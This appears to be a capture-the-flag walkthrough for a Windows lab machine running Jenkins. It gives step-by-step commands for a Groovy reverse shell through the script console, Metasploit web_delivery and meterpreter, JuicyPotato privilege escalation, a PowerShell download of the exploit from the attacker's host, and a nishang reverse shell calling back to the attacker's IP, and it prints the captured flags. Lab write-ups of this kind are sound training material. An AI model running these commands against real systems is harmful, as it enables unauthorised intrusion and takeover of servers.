@@ -1,0 +1,146 @@
+Impersonation Attacks
+
+We start with our nmap scan: nmap -p- -sC -sV --min-rate 5000 (target ip)
+
+We see that four tcp ports are open:80,135,445, and 50000
+
+Going to the website:(target ip):80, we see a Jeeves website. We can type in the text input field and click search. This will leade us to what is seems to be an error thrown by SQL. However, this is just an image. Probably this website is not vulnerable for SQLi.
+
+We go the website:(target ip):50000, we see an error page. We use dirbuster:dirbuster&. This will open a GUI.
+
+We specify what website we are targeting. We check go faster. Then, we specify what list should be used. The list that we are using is:/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt .
+
+We find that there is a website hidden at: (target ip):50000/askjeeves.
+
+This is a Jenkins webserver. Excellent, we can use the Script Console feature in Jenkins to have a reverse shell. 
+
+Snce Jenkins Script Console uses a langauge called Groovy script, we can simply search for Groovy script reverse shell in Google.
+
+We find a result, this Github repository has a code which we can use :https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76.
+
+We copy and paste this code in the Script Console, but we first need to change the localhost to our ip address (keep the quotation marks). 
+
+We open netcat to listen on whatever port that was specified in the code that we pasted in teh Script Console: nc -nvlp (port number).
+
+Then, we run our Groovy script. We have an access to the machine. This was easy.
+
+
+We do: whoami /priv, we find that we have Impersonate a client after authentication enabled.
+
+We 
+
+We will use windows-exploit-suggester.py: https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
+
+First, we copy the systeminfo by doing: systeminfo in the target machine.
+
+We paste the result in a text file. 
+
+We copy the content of the windows-exploit-suggester.py in a python file where we saved the systeminfo.
+
+Then, we do: sudo python2 ./windows_exploit_suggester.py --update. This will create a xls file. 
+
+Since this tool is quite old, we will do: python -m pip install --user xlrd==1.1.0 . This will avoid any erros.
+
+Then, we will do: python3  ./windows-exploit-suggester.py --database (xls file name) --systeminfo (text file that has the systeminfo name)
+
+We will use Metasploit:
+
+Open metasploit, we do:use exploit/multi/script/web_delivery . 
+
+If we wanted to see what targets we can attack,we do: show targets.
+
+This will show us multiple targets with their IDs. We are interested in Powershell which has ID of 2.
+
+We do: set target 2.
+
+We do: set lhost tun0. We do: set srvhost tun0. We do set port 4444. We do : set payload windows/meterpreter/reverse_tcp 
+
+Then, we run. We will get a command that we copy and run it on the target machine.
+
+We go back to metasploit cmd. Once we see the following Meterpreter session 1 opened ....., we know that we have successfully have a reverse shell. We simply do: sessions 1.
+
+To see what exploits are available, we do: run post/multi/recon/local_exploit_suggester . 
+
+We will be using exploit/windows/local/ms16_075_reflection . We do: use exploit/windows/local/ms16_075_reflection
+
+We do: options, to make sure that everything is set correctly. Set port to something different than the current session port. For example, if the session port is running on 4444, set the port to 5555.
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Metasploit didnt work for me so we will try another way not using Metasploit:
+
+We will use the juicy potato exploit.
+
+We download juicypotato.exe from this Github repository: https://github.com/ohpe/juicy-potato/releases, and save it into a folder. We aim to upload this file to the target machine.
+
+We will open a basic http port using python: python3 -m http.server 80
+
+On the target machine, we will use powershell to upload the file :
+
+Powershell -c"(new-object System.Net.WebClient).DownloadFile('http://(our ip address)/JuicyPotato.exe', 'C:\Users\Public\JuicyPotato.exe')"
+
+Note: The http server port should be on the same directory as the juicypotato file. 
+
+On the target machine, we change the directory where we uploaded the juicypotato file. 
+
+We run the exploit as follows: JuicyPotato.exe -t * -p cmd.exe -l 7777
+
+We will need to have a powershell reverse shell. To achive this, we will use nishang tool. We will specifically use the file invoke-Powershelltcp.ps1 under the directroy shells in the tool. https://github.com/samratashok/nishang
+
+We download the reverse shell file into our machine. 
+
+We need first to edit the file before uploading it to the target machine. We add this line to the end of the file : Invoke-PowerShellTcp -Reverse -IPAddress (our ip address) -Port 9990 
+
+We save our changes to the file. Then we upload the file to the target machine to the same directory where we uploaded the juicypotato file
+
+We also need to create a batch file (.bat) to be uploded on the target machine.
+
+
+We will put this line of code in it : powershell -ep bypass -c "C:\Users\Public\tcprev.ps1"
+
+tcprev.ps1 is what we called the reverse tcp shell file that we uploaded to the target machine.
+
+We upload the batch file to the target machine, again where we uploaded the two previous files.
+
+We listen on port 9990 using netcat: nc -nvlp 9990, which is the same port that we specified in the .ps1 file . 
+
+On the target machine, we run the juicy potato file: JuicyPotato.exe -t * -p exploit.bat -l 7777. 
+
+Note: exploit.bat is the name of the batch file that we created and uploaded to the target machine.
+
+If we went back to netcat, we can see that we have access to the machine as administrator.
+
+Going to the desktop of administrator, we find a file named hm.txt. If we see what it contains, we are welcomed with a message telling us that the root flag is not here and to look deeper.
+
+On the administrator desktop we do: Get-Item -path .\hm.txt -stream * 
+
+explaination using chat gpt: The command "Get-Item -path .\hm.txt -stream *" is a PowerShell command used to retrieve the alternate data streams associated with a file named "hm.txt" located in the current directory (denoted by ".").
+
+In Windows, NTFS (New Technology File System) supports the concept of "alternate data streams," which allows a file to have multiple sets of data streams, each identified by a distinct name. By default, files have a single data stream containing their main content, but they can also have additional named data streams that store metadata or other information.
+
+In the provided command:
+
+Get-Item: This is a PowerShell cmdlet used to retrieve information about a file or directory.
+
+-path .\hm.txt: This is the path parameter specifying the file's location. In this case, it's located in the current directory (.) and is named "hm.txt".
+
+-stream *: This parameter instructs the command to retrieve all alternate data streams associated with the specified file. The asterisk (*) is a wildcard character that represents "all" streams.
+
+When you execute this command in PowerShell, it will display information about all the alternate data streams associated with the "hm.txt" file, if any exist. If the file doesn't have any alternate data streams, the command will not return any additional output beyond the standard information about the file itself.
+
+
+This will show us the hidden root flag file. We can get the content of the root.txt file by : Get-Content -path .\hm.txt -stream root.txt
+
+
+
+user flag: e3232272596fb47950d59c4cf1e7066a
+
+admin flag: afbc5bd4b615a60648cec41c6ac92530
+
+//END
+
+
+
+
+
+
